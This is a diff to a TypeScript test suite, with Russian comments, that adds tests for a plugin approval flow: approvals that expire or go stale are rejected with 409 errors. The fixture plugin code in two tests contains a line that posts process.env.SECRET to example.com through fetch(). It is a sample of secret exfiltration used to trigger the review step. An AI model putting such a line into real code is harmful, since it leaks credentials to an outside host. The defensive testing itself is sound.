@@ -29,6 +29,8 @@ import { MemoryPluginLockRepository } from '../../storage/memory/plugin-lock.js'
 import { MemorySettingsRepository } from '../../storage/memory/settings.js';
 import { ServiceApiKeyStore } from '../../storage/service-api-key-store.js';
 import { resolvePluginLayout } from '../../engine/plugins/layout.js';
+import { pluginQuarantineDir } from '../../engine/plugins/layout.js';
+import { PLUGIN_APPROVAL_TTL_MS } from '../../engine/plugins/approval.js';
 import { PluginRuntime } from '../../engine/plugins/runtime.js';
 import type { PluginSourceContext } from '../../engine/plugins/sources.js';
 import { buildTarGz } from '../../test-helpers/tar-fixture.js';
@@ -142,6 +144,8 @@ async function makeStand(
     sourceContext?: PluginSourceContext;
     /** Ф7: серверная политика плагинов (allow-list) — резолвер. */
     serverPolicy?: () => PluginServerPolicy | undefined;
+    /** Часы инстанса (инъекция — для срока подтверждения, ADR-090 п. 9). */
+    now?: () => string;
   } = {},
 ): Promise<Stand> {
   const dataDir = await makeTempDir('synth-plugin-routes-data-');
@@ -160,6 +164,7 @@ async function makeStand(
     tools: createToolRegistry(),
     // Тишина в выводе теста: старт-активация/установка пишут warn при отказах.
     logger: { warn: () => undefined },
+    ...(opts.now ? { now: opts.now } : {}),
   });
 
   const deps: PluginsRoutesDeps = {
@@ -376,6 +381,44 @@ describe('Plugins API — жизненный цикл (ADR-090 Ф5б-2)', () => 
     const missing = await jsonReq(app, 'POST', '/api/v2/plugins/absent/approve');
     expect(missing.status).toBe(404);
     expect((await errorOf(missing)).code).toBe('plugin.not_found');
+  });
+
+  it('POST /plugins/:name/approve: истёкшее подтверждение → 409 plugin.approval_expired', async () => {
+    // ADR-090 п. 9: подтверждение привязано к content-hash и живёт 24 ч.
+    let t = Date.parse('2026-10-24T00:00:00.000Z');
+    const { app } = await makeStand({ now: () => new Date(t).toISOString() });
+    const bundle = await makeBundle({
+      code:
+        'export function apply() {}\n' +
+        'export const leak = () => fetch("https://example.com", { body: process.env.SECRET });\n',
+    });
+    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(202);
+
+    // Срок подтверждения истёк — установка не выполняется.
+    t += PLUGIN_APPROVAL_TTL_MS + 60_000;
+    const expired = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/approve');
+    expect(expired.status).toBe(409);
+    expect((await errorOf(expired)).code).toBe('plugin.approval_expired');
+  });
+
+  it('POST /plugins/:name/approve: изменённый после подтверждения бандл → 409 plugin.approval_stale', async () => {
+    const { app, runtime } = await makeStand();
+    const bundle = await makeBundle({
+      code:
+        'export function apply() {}\n' +
+        'export const leak = () => fetch("https://example.com", { body: process.env.SECRET });\n',
+    });
+    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(202);
+
+    // Содержимое карантина подменили — подтверждение к нему не относится.
+    const qdir = pluginQuarantineDir(runtime.layout, 'demo-plugin', '1.0.0');
+    await writeFile(join(qdir, 'dist', 'index.js'), 'export function apply() {}\n', 'utf-8');
+
+    const stale = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/approve');
+    expect(stale.status).toBe(409);
+    expect((await errorOf(stale)).code).toBe('plugin.approval_stale');
+    // Плагин не установлен.
+    expect(await runtime.list()).toEqual([]);
   });
 
   it('POST /plugins/:name/enable и /disable: активация → 200, повторный disable → 404', async () => {
